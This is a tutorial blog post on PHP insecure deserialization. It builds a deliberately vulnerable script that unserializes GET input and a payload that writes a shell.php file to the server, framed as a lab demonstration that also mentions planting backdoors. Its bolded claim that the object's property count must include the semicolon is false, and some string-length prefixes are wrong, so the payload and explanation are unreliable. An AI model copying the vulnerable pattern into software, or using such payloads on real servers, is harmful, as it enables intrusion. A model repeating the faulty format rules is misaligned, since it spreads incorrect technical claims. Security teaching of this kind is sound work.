---
layout: post
title: PHP - Insecure Deserialization
category: VRD
---
# Introduction
The OWASP Top 10 illustrates Insecure Deserialization as A8, in which serialization is a key problem facing Web Application developers. But what is Insecure Deserialization, why is it a problem and how does it work? The aim of this post is to answer these to questions to shed some further light in this vulnerability area. The following examples and lessons will be demonstrating utilising php 7.xs serialize and unserialize functions.

# What is Insecure Deserialization
Before we can dive into what Insecure Deserialization is really about, we first must understand what serialization truely is. 
Serialization is the process of taking particular objects of information such as memory captures and converts them into a stream of bytes. Once the object has become maluable we can then begin to transfer such data across a network or store it onto a hard drive. 
![serialization](/images/insecure_deserialization/serialization.png "serialization")
The following function in php to perform the mutation of object to bytes is as follows:
```
$my_object = serialize($variable);
```

Although serializing an object into a structure of bytes, we then require to deserialize the content back to its original form.
![deserialization](/images/insecure_deserialization/deserialization.png "deserialization")
The following function in php to perform the mutation from bytes to object is as follows:
```
$my_bytes = unserialize($variable);
```

If this is still rather a foreign idea, Willy Wonka's WonkaVision is a great way to visualise serialization (although your object wont be smaller on the other end.... hopefully).

[![WonkaVision](https://i.ytimg.com/vi/pvS3j8VtanM/hqdefault.jpg)](https://www.youtube.com/watch?v=pvS3j8VtanM "Willy Wonka & the Chocolate Factory - It's WonkaVision Scene")

*Movieclips: https://www.youtube.com/watch?v=pvS3j8VtanM*

# Why is Insecure Deserialization a Problem
Serialization should be considered similar to that of user input. For anyone that does not do large amounts of user interaction within Web Applications a general rule of thumb is to never trust user input. The reason we do not trust user input is that if malicious content does get submitted we are at the mercy of the attacker. This can therefore be applied to trusting serialized data. This approach is also demonstrates through PHPs manual warning that you should utilise JSON in man cases. However, as much as JSON is good at particular tasks, there are certain scenarios where serialization is the only ability to transfer such data e.g., Memory Captures.
![PHPWarning](/images/insecure_deserialization/php_warning.png "PHP Unserialize Warning")

As much as PHP demonstrates warns developers, so does the Open Web Application Security Project (OWASP). OWASP rates Insecure Deserialization at 8th place in its 2017 [OWASP Top 10](https://www.owasp.org/index.php/Top_10-2017_Top_10) listing. Within listing a breakdown of the exploitability, prevalence, detectability and technical know how is illustrated through the following OWASP graphic. It is noteworthy in that the business impact is largely unknown and the requirement of human intelligence to detect such issues is needed as it is difficult to automate such attacks.
![OWASP](/images/insecure_deserialization/owasp_breakdown.png "OWASP Breakdown")

# Where Can We Find Deserialization?
A precursor to a Deserialization vulnerabilities, is that we actually require some form of Serialized input.
If we were to capture a packet through Burp that utilises serialization, we can see the inner workings of a packet and how a Serialized input is formed. 
![Burp](/images/insecure_deserialization/burp.png "Packet Capture Burp")

Within this packet we may see a potential string as follows:
```
data=O:6:"attack":3:{s:4:"file";s:9:"OriginalFileName";s:4:"data";s:19:"OriginalDataContent";}

```
Of interest, the core code is of interest:
```
data=O:6:"attack"
:3:
{s:4:"file";
s:4:"data";
}

```
These are the four key aspects of a Serialized input. Starting with the programs class, how many variables are situated within the class, the names of the variables and the semi colon (This will be explained in-depth further on). This structure provides us with our testing string, which we can utilise and manipulate for our exploit payload.

# How does Insecure Deserialization Work
Large portions of the issue stem from the trust relationship that developers and programming languages have between the serialize and deserialize (unserialize for PHP) functions have between each other. This is due to the autoloading and execution of code through functions such as:

Serialize Magic Methods
```
__construct()
__sleep()
__toString()
```

Unserialize Magic Methods
```
__destruct()
__wakeup()
__toString()
```

All of these functions will always be called when either serialize or unserialize is used. As a side note for anyone who does not know what magic methods are, they are accessor functions for particular classes of objects within the language, please see the following link for further information: <https://culttt.com/2014/04/16/php-magic-methods/>.

With this in mind, the following is a sample program to demonstrate how Insecure Deserialization is utilised to attack a computer system. I have saved this file under the name of deserialization_attack.php within the directory of OOP.
```
<?php
/**
 * A simple program to demonstrate Insecure Deserialization
 *
 * @author eXit
 */


/**
 * Class attack
 *
 */
class attack
{
    /**
     * __constructor for the class attack to set the
     * filename and file content sent via the serialized attack string.
     * @param string $file
     * @param string $data
     */
    public function __construct($file, $data)
    {
        $this->file = $file; // Take in a single parameter of a filename, this can be statically encoded and the attack will work .e.g, $this->file = "test.txt";
        $this->data = $data; // Take in a single parameter of the files contents, this can be statically encoded and the attack will work .e.g, $this->data = "test";
    }

    /**
     * __destructor for when unserialized is called,
     * this will generate a file based on what the files name is passed
     * along with the contents that are passed.
     */
    function __destruct()
    {
        file_put_contents($this->file, $this->data);
    }
}
$data = unserialize($_GET['data']); //Get parameter for ease of use, however, this can be a post request as well
?>

```

Using a standard LAMP server, I am running Ubuntu 18.04 with the most up to date Apache, MySQL and PHP situated on VMWare ESXI I can traverse to my server's URI and locate my file as follows:
```
http://myWebServer/OOP/deserialization_attack.php
```

Now that we have our environment and testing program we can begin to craft our attack.
We can use the serialize function to generate our string lengths and attack pathingas follows:
```
$my_string = serialize('<?php phpinfo(); ?>');
```
Which will output
```
s:19:"<?php phpinfo(); ?>"; 
```
While this looks confusing to start with, please stay along for this as it does get much easier to read once explained.

So what does a full attack payload look like you might be asking, well here it is...
```
data=O:6:"attack":3:{s:4:"file";s:9:"shell.php";s:4:"data";s:19:"<?php phpinfo(); ?>";}

```
The structure however, can be broken down as follows (left side is the serialized string shown above, and the right side is our PHP code in our sample deserialization_attack.php file):

```
data -> is our $_GET['data']
O:6:"attack" -> is class attack, which is our object of type class attack which is 6 characters in length,e.g., it would be O:4:"test" if we renamed the class from attack to test
:3: -> is the three parameters that are within our object $file, $data AND our ';' end line
```
**It is vital to remember that many of the example that are on the internet show a :2: after their class object, however, you must remember to incorporate your semi colon into the calculations, otherwise the exploit will not work!**

The final section is what we specify for our parameters within our magical constructor function.
```
s:4:"file" -> specifies our first parameter $this->file
s:9:"shell.php" -> specifies the value that is set within $this->file, which in this case is shell.php
s:4:"data" -> specifies our second parameter $this->data
s:19:"<?php phpinfo(); ?>" -> specifies the value that is set within $this->data, which is our phpinfo() as it is a quick way to see if we can execute on commands on the server
```
**It is important to remember the string lengths such as s:19 when writing content into such fields as being off will either prevent the file from being made or from the contents being written to said file. Accuracy is key!**
If we were to unserialize our string and output the contents via a var_dump we would get a prettified version as shown in the image below.
![VARDUMP](/images/insecure_deserialization/var_dump.png "Var Dump")

As we are using a [GET](https://www.w3schools.com/tags/ref_httpmethods.asp) request, we can now pass our serialized string into our browser URL and submit our payload as follows:
```
http://myWebServer/OOP/deserialization_attack.php?data=O:6:"attack":3:{s:4:"file";s:9:"shell.php";s:4:"data";s:19:"<?php phpinfo(); ?>";}
```

If successful we can check our server either by traversing the file path on the actual server and seeing the contents.

![File](/images/insecure_deserialization/file.png "shell.php file")

Opening the file we can then see our file will have written the phpinfo(); within.

![payload](/images/insecure_deserialization/payload.png "shell.php contents")

Finally, the added caveat to this example is that, because we are uploading our content can we traverse to it? 
```
http://myWebServer/OOP/shell.php
```
Using our web browser and the following URL we should see an output below.
![webshell](/images/insecure_deserialization/web_shell.png "web shell")

Although this example demonstrates a very rudimentary example, the key components of how Insecure Deserialization works, while also demonstrating a possible method to implement an attack to install a php, war or bash backdoor.

# Conclusion
Insecure Deserialization from the outset seems rather difficult to perform, however, the fundamental attack methodology is fairly straight forward. The drawback to this attack is that, it can take significant reconnaissance to workout the intricacies of the underlying code while being some what blind (BlackBox testing). Typical targets for this attack methods focus towards APIs, however, it should always be considered when serialization is ever being used.

From a secure development consideration, it is recommended that one should use JSON or other forms data formatting, but if you must use serialization then a fundamental rule is to never trust serialized data input when using such functionality.